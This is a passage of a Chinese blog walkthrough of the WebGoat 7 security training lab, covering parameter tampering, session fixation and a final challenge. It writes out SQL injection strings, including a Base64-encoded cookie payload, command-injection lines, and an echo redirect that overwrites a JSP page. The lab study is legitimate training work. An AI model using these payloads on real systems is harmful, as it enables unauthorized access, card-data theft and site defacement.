+</code></pre><p><img alt="Figure04" img-src="a89dde1813dad940af6dfd3ef930a6794bac0ab9.jpg"> <img alt="Figure04" img-src="49cb64bd4552000e81505cc42fa1fd2d392d0fb8.jpg"></p><p>爆破点1=10返回报文为1334是因为10比1-9多一位,那么对正确的报文进行搜索Fliter,得到结果</p><p><img alt="Figure04" img-src="167ae5743e2eb0f479b008501ad95c68c3fda649.jpg"></p><p>用户名爆破成功</p><h1>0x05 进阶</h1><h2>Denial of Service-ZipBomb</h2><p>意思是突破2MB文件限制上传20MB的以上的东西,感觉应该是拦截某些Request,然后修改一些参数.</p><p>但是我拦截的Request的file字段都是[object file]不管传什么都没响应..感觉是坏掉了这道题</p><h2>Denial of Service-Denial of Service from Multiple Logins</h2><p>解释了一下DDOS攻击的原理...就是访问的人太多了,多登录几次就好了</p><h2>Insecure Communication-Insecure Login</h2><p>介绍了HTTP报文和HTTPS报文的区别,题目原意是让你</p><ol><li>拦截HTTP报文看到密码</li><li>然后进入回答密码是多少</li><li>切换到HTTPS看看还能不能看到报文</li></ol><p>但是切换到HTTPS之后,打不开网页,可能是WebGoat没有提供HTTPS的服务吧....题目坏掉了又</p><h2>Insecure Storage-Encoding Basics</h2><p>讲了常见的编码基础,以及是否可以被解密,需要注意的是BASE64不是加密,而是一种编码,虽然英文都是Encode</p><h2>Malicious Execution-Malicious File Execution</h2><p>题目的目的是</p><ol><li>前端会对上传的文件做本地检查</li><li>先上传满足检查的文件</li><li>拦截报文,修改成另外一个可执行文件如JSP</li><li>如果服务端没有检查,就能被执行</li></ol><p>但是貌似题目坏掉了..别说恶意文件...正常图片都上传不了</p><h2>Parameter Tampering-Bypass HTML Field Restrictions</h2><p>修改页面的HTML文本解除一些前端的限制,如按钮是否可用</p><h2>Parameter Tampering-Exploit Hidden Fields</h2><p>查看HTML文本找到一些被打了Hidden标记的元素</p><h2>Parameter Tampering-Exploit Unchecked Email</h2><p>找到被Hidden的Email或者通过拦截修改发送Email的地址</p><h2>Parameter Tampering-Bypass Client Side JavaScript Validation</h2><p>修改存在页面上的JS文件使得前端的正则校验失效,从而给服务端发超出限制的字符</p><h2>Session Management Flaws-Hijack a Session(有疑问)</h2><p>Session劫持,题目的本意是让你在两次登录生成不同的Session之间,估算哪个Session已经被人使用了,然后进行爆破....但是我没有做出来,BurpSuite没有找到对应的Session Analyze的地方.</p><h2>Session Management Flaws-Session Fixation</h2><p>Session串改,题目的意思如下</p><ol><li>你伪造一个带有Session的链接发送给别人,在邮件内容后加&amp;SID=WHAT</li><li>别人用你的链接进行了登录,使用账户密码Jane/tarzan</li><li>点击下一步发现&amp;SID=NOVALIDSESSION</li><li>此时你只需要用刚刚发送的Session值,就可以直接进入别人账户</li></ol><p>原Session链接</p><pre><code>WebGoat/start.mvc#attack/311/1800&amp;SID=NOVALIDSESSION
+</code></pre><p>修改为Seesion链接</p><pre><code>WebGoat/start.mvc#attack/311/1800&amp;SID=WHAT
+</code></pre><p>进入Jane账户成功</p><h2>Web Services-Create a SOAP Request&amp;WSDL Scanning</h2><p>简单介绍了什么是SOAP和WSDL,但是它提供的?WSDL我没有看到WSDL而是看到了一堆Error</p><p>具体学习<a href="http://alanli7991.github.io/2016/03/03/WebSerivce的学习/">Web Services的文章可以看这里</a></p><h2>Web Services-Web Service SQL Injection&amp;Web Service SAX Injection</h2><p>利用Web Services进入SQL注入和SOAP报文注入,原理和其它注入攻击一样,由于WebGoat的Web Service服务有问题...也没有完成</p><h2>Admin Functions-Report Card</h2><p>学习记录卡...没什么用</p><h1>0x06 Challenge</h1><hr><h2>Challenge</h2><p>大结局,先来吐槽一下,这个Challenge如果能不看答案做出来...我觉得就已经不是初学者了,总会出现各种开挂的步骤,或者说为了出题而出题,思路对了但是不选特定的选项就不会出结果....</p><p>先来列举下这里用到了哪些知识</p><ol><li>HTML源码审计</li><li>BASE64编码</li><li>SQL注入</li><li>命令行注入</li></ol><p>其中每一个知识点用于</p><ol><li>用于发现管理员帐号和密码</li><li>用来解析Cookie</li><li>用来对Cookie进行注入获取信用卡</li><li>用于查询js文件路径,和篡改网页</li></ol><h3>Stage1</h3><p>越权登录一般有两种方法</p><ol><li>获取到管理员帐号</li><li>进行注入无效化密码</li></ol><p>先对密码进行注入试一试</p><pre><code>#!sql
+password' OR '1'='1
+</code></pre><p>发现不行,然后分析HTTP报文</p><p><img alt="Figure01" img-src="02727e5a4bb08dc1d138c0b26b745709cac4fd91.jpg"></p><p>发现输入可能可以注入的点有Username/Password/Submit/user/user(Cookie)这几个,用户名一般不能进行注入,密码又试验过了,还剩下user和user(Cookie)</p><p>发现Cookie中的User是个编码,先去看看是什么,通过尝试,发现Base64编解码发现Cookie中会存user参数</p><p><img alt="Figure02" img-src="153fff782125e6b2b8864e3aaa1c1e2a13580a0f.jpg"></p><p>对两个都进行注入试试,先是user,然后把注入代码编码成Base64再放入user(Cookie)</p><pre><code>#!sql
+youaretheweakestlink' OR '1'='1
+eW91YXJldGhld2Vha2VzdGxpbmsnIE9SICcxJz0nMQ==
+</code></pre><p>发现都不行,还是登录不进去,真是坑了大爹了...现在只好思考这个"youaretheweakestlink"是什么,所以去读HTML源码,发现了这一个</p><pre><code>#!html
+&lt;input name="user" type="HIDDEN" value="youaretheweakestlink"&gt;
+</code></pre><p>可以看到它的字段是name,难道是管理员帐号?所以使用这个登录一下,然后同时进行注入攻击,发现还是他娘的进不去....</p><p><font color="red">到这里我就跪了,万念俱灰...只要去打开youtube(你土鳖)看看答案</font></p><p>当我知道答案的时候...恨不得把作者打一顿....分明是在开挂!</p><p><strong>首先总结一下,youaretheweakestlink作为用户名是猜对了,可是密码在哪呢?</strong>只看到答案打开了一个链接</p><pre><code>local:8080/WebGoat/source?source=true
+</code></pre><p>把WebGoat后的都删掉,然后加上source,还要给source赋值为true....这个source尼玛哪里出现的啊...如果不赋值为true还不能看到源代码,在源代码的121行</p><pre><code>121      private String pass = "goodbye";
+122  
+123      private String user = "youaretheweakestlink";
+</code></pre><p>可以看到密码"goodbye"...尝试登录发现进去了</p><h3>Stage2</h3><p>第二步是让取出所有信用卡信息,这种根据以往的练习,肯定都是使用SQL注入让某个SELECT语句取出所有信息,根据BurpSuite的拦截信息或者Network来看的话,<strong>进入第二个页面之后,并没有任何请求出现</strong>,所以说注入点肯定还在登录的时候</p><p>依次对Username/Password/Submit/user/user(Cookie)这几个注入点进行检查,发现user(Cookie)进行注入就可以获得到所有信用卡信息,但是注意使用的是Base64编码后的信息</p><pre><code>#!sql
+youaretheweakestlink' OR '1'='1
+//编码后注入代码为
+eW91YXJldGhld2Vha2VzdGxpbmsnIE9SICcxJz0nMQ==
+</code></pre><h3>Stage3</h3><p>第三步发现是各种网络协议的表单,根据经验判断(就是猜)这种表单一般有两种获取形式</p><ol><li>利用SQL从数据库读取</li><li>利用cmd命令行得到</li></ol><p>先尝试拦截报文,对file字段做SQL注入,发现没有效果.然后进行命令行注入,通用命令"ls"</p><pre><code>#!bash
+tcp &amp;&amp; ls
+</code></pre><p><font color="red">这里注意坑爹的事情</font></p><p>由于是为了出题而出题,只有tcp具有命令行注入功能,选其它的选项卡都不行,是因为Java在源代码里做判断,只在tcp时让其<strong>故意</strong>有注入漏洞.<a href="https://www.youtube.com/watch?v=kvX7ORKmPBc">Youtube上视频是5.2版本</a>的...使用的是ip进行的注入,耽搁了老子好久...</p><p>还有一点需要注意,Youtube上给出的注入命令是</p><pre><code>#!bash
+&amp;&amp; pwd &amp;&amp; ls &amp;&amp; find -name "webgoat_challenge_guest.jsp"
+</code></pre><p>这些指令在Mac下是无效的,Mac下需要的指令主要是find不一样</p><pre><code>#!bash
+tcp; pwd; ls; find . -iname "webgoat_challenge_guest.jsp";
+</code></pre><p>通过命名行注入,我们可以得到webgoat&#95;challenge&#95;guest.jsp文件的地址</p><p><img alt="Figure03" img-src="70c576500ddf7dc458d7a4c999ee7e8f32d560e5.jpg"></p><p>然后可以使用另外一段自定义的HTML文本代替webgoat&#95;challenge&#95;guest.jsp,原理是利用了命令行注入的</p><pre><code>#!bash
+echo "text" &gt; file
+</code></pre><p>意思是使用清空file的内容文本,填充"text"进入file,对应的另外一个</p><pre><code>#!bash
+echo "text" &gt;&gt; file 
+</code></pre><p>保留file的内容文本,后续补充"text",<a href="http://jingyan.baidu.com/article/a501d80c0c9cbaec630f5e8d.html">百度原理看这里</a>,构造注入语句</p><pre><code>#!bash
+tcp; echo "&lt;html&gt;&lt;body&gt;Mission Complete&lt;/body&gt;&lt;/html&gt;" &gt; WebGoat/webgoat-container/target/webgoat-container-7.1-SNAPSHOT/webgoat_challenge_guest.jsp
+</code></pre><h3>Stage4</h3><p>任务完成了,WebGoat的练习题只能说坑爹坑爹十分坑爹...但是总体来说还是熟悉了常用的攻击手段...学到了不少东西</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/papers/155" rel="bookmark" id="re1">CSRF简单介绍及利用方法</a></li><li><a href="http://drops.wooyun.org/papers/1024" rel="bookmark" id="re2">雅虎某分站的XSS导致雅虎邮箱沦陷</a></li><li><a href="http://drops.wooyun.org/papers/512" rel="bookmark" id="re3">Short XSS</a></li><li><a href="http://drops.wooyun.org/tips/3059" rel="bookmark" id="re4">xss挑战赛writeup</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Alan.Li</span> <span class="reply-time">2016-03-29 16:10:57</span></div><p></p><p>@我晕 该文章是7.0版本WebGoat每一个章节的详解和教程</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">我晕</span> <span class="reply-time">2016-03-14 08:39:13</span></div><p></p><p>有啥用 有啥用 有啥用</p><p></p></div></div></div></div></div></main>
